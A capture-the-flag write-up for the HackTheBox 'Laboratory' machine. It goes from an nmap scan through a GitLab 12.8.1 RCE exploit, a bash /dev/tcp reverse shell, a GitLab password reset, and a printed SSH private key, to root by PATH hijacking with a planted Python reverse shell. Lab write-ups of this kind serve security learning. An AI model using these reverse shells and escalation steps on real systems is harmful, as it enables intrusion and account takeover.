# Laboratory - HackTheBox
Linux, 20 Base Points, Easy

## Machine

![‏‏Laboratory.JPG](images/‏‏Laboratory.JPG)
 
## Laboratory Solution

### User

So let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $nmap -sC -sV -oA nmap/Laboratory 10.10.10.216
# Nmap 7.80 scan initiated Thu Jan 28 14:05:29 2021 as: nmap -sC -sV -oA Laboratory 10.10.10.216
Nmap scan report for 10.10.10.216
Host is up (0.074s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 28 14:05:52 2021 -- 1 IP address (1 host up) scanned in 22.72 seconds

```

So we can see port 80 redirect to ```https://laboratory.htb/``` and we can see the DNS: ```DNS:git.laboratory.htb``` , Let's add ```laboratory.htb``` and ```git.laboratory.htb``` domains to ```/etc/hosts```:
```console
10.10.10.216	laboratory.htb git.laboratory.htb
```

Now, Let's try to browse to ```https://laboratory.htb/``` and to register to Gitlab:

![443git.JPG](images/443git.JPG)

The Gitlab version is 12.8.1, we can use the following exploit [https://github.com/dotPY-hax/gitlab_RCE](https://github.com/dotPY-hax/gitlab_RCE) to get shell, So let's try it:

```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $python3 gitlab_rce.py https://git.laboratory.htb 10.10.14.14
Gitlab Exploit by dotPY [insert fancy ascii art]
registering 9wWci6zGgB:dULgwccA65 - 200
Getting version of https://git.laboratory.htb - 200
The Version seems to be 12.8.1! Choose wisely
delete user 9wWci6zGgB - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP

```

Let's try use option 2:
```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $python3 gitlab_rce.py https://git.laboratory.htb 10.10.14.14
Gitlab Exploit by dotPY [insert fancy ascii art]
registering 9wWci6zGgB:dULgwccA65 - 200
Getting version of https://git.laboratory.htb - 200
The Version seems to be 12.8.1! Choose wisely
delete user 9wWci6zGgB - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 2
Start a listener on port 42069 and hit enter (nc -vlnp 42069)
```

Now, we need to listen to port ```42069```:
```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $nc -lvp 42069
listening on [any] 42069 ...
```

Press on enter and get the shell:
```console
....
Start a listener on port 42069 and hit enter (nc -vlnp 42069)
registering LcQbQYMZ3K:iGXuYz3pBQ - 200
creating project dtSt8XXSgp - 200
creating project zGIQvGIwTR - 200
creating issue wkzjYBYbMe for project dtSt8XXSgp - 200
moving issue from dtSt8XXSgp to zGIQvGIwTR - 200
Grabbing file secrets.yml
deploying payload - 500
delete user LcQbQYMZ3K - 200
```

Shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $nc -lvp 42069
listening on [any] 42069 ...
connect to [10.10.14.14] from laboratory.htb [10.10.10.216] 46726
whoami
git
```

Let's upgrade this shell using the following command:
```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $nc -lvp 42069
listening on [any] 42069 ...
connect to [10.10.14.14] from laboratory.htb [10.10.10.216] 46726
whoami
git
bash -i >& /dev/tcp/10.10.14.14/4242 0>&1;
```

```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $nc -lvp 4242
connect to [10.10.14.14] from laboratory.htb [10.10.10.216] 43046
bash: cannot set terminal process group (397): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$ 
```

By clicking on Projects->Explore Projects we can see the follow:

![projects.JPG](images/projects.JPG)

It's mean we have another user called ```dexter``` with repository, We have shell with git user, we can use ```gitlab-rails``` console to change another gitlab users password (we need to change dexter user password).
We can read about that on the following link [https://docs.gitlab.com/ee/security/reset_user_password.html](https://docs.gitlab.com/ee/security/reset_user_password.html), Let's try it:

```console
git@git:~/gitlab-rails/working$ gitlab-rails
gitlab-rails
The most common rails commands are:
 generate     Generate new code (short-cut alias: "g")
 console      Start the Rails console (short-cut alias: "c")
 server       Start the Rails server (short-cut alias: "s")
 test         Run tests except system tests (short-cut alias: "t")
 test:system  Run system tests
 dbconsole    Start a console for the database specified in config/database.yml
              (short-cut alias: "db")

 new          Create a new Rails application. "rails new my_app" creates a
              new application called MyApp in "./my_app"


All commands can be run with -h (or --help) for more information.
In addition to those commands, there are:
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
-------------------------------------------------------------------------------
```

Now, Let's try to find ```dexter``` user by ```user = User.find_by_username('dexter')``` command and change ```dexter``` pasword:
```console
...
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
-------------------------------------------------------------------------------

user = User.find_by_username('dexter')
user.password = 'secret_pass'
user.password_confirmation = 'secret_pass'
user.save!

```

So after we changed the password of```dexter``` user we can log in to ```https://git.laboratory.htb``` using new credentials ```dexter:secret_pass``` and from repository we can get ```dexter``` ssh private key file which contains:

```console
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Let's save it in file called ```id_rsa```.

Now, We can use ```ssh``` with dexter private key file:

```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $ssh -i id_rsa dexter@10.10.10.216
dexter@laboratory:~$ cat user.txt
fc6dfa2acdaf5c2c28794509a861da5a
```

And we get the user flag ```fc6dfa2acdaf5c2c28794509a861da5a```.

### Root


Let's try to find ```SUID``` file:
```console
dexter@laboratory:~$ find / -user root -perm /4000 2>/dev/null | grep -v snap
/usr/local/bin/docker-security
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/chsh
/usr/bin/mount
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```

The file ```/usr/local/bin/docker-security``` looks intresting, Let's get this file using ```nc``` and analyze it using ```Ghidra```.

We can see the following ```main``` function:

![mainghidra.JPG](images/mainghidra.JPG)

```c
void main(void)

{
  setuid(0);
  setgid(0);
  system("chmod 700 /usr/bin/docker");
  system("chmod 660 /var/run/docker.sock");
  return;
}
```
We can see the call to ```chmod```, If we can change the ```PATH``` and create our ```chmod``` It's mean when we run ```docker-security``` with root privilage we can run our ```chmod``` as root.

So first, Let's create new ```chmod``` that contains ```python``` reverse shell:
```python
dexter@laboratory:/tmp$ chmod +x ./chmod
dexter@laboratory:/tmp$ cat chmod 
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Listen to port 1234:
```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $nc -lvp 1234
````

Set ```PATH``` to ```/tmp``` where our ```chmod``` located and run ```/usr/local/bin/docker-security```:
```python
dexter@laboratory:/tmp$ export PATH=/tmp
dexter@laboratory:/tmp$ /usr/local/bin/docker-security
```

And we get ```root``` shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Laboratory]
└──╼ $nc -lvp 1234
connect to [10.10.14.14] from laboratory.htb [10.10.10.216] 42262
bash: groups: command not found
Command 'lesspipe' is available in the following places
 * /bin/lesspipe
 * /usr/bin/lesspipe
The command could not be located because '/bin:/usr/bin' is not included in the PATH environment variable.
lesspipe: command not found
Command 'dircolors' is available in the following places
 * /bin/dircolors
 * /usr/bin/dircolors
The command could not be located because '/bin:/usr/bin' is not included in the PATH environment variable.
dircolors: command not found
root@laboratory:/tmp#
````

Now, we need to use ```cat``` command, So let's change again the ```PATH``` and print the root flag:
```console
root@laboratory:/tmp# export PATH=/usr/bin
export PATH=/usr/bin
root@laboratory:/tmp# cat /root/root.txt
cat /root/root.txt
620d26257f7e16c19d8371e4921792b8
```

And we get the root flag ```620d26257f7e16c19d8371e4921792b8```.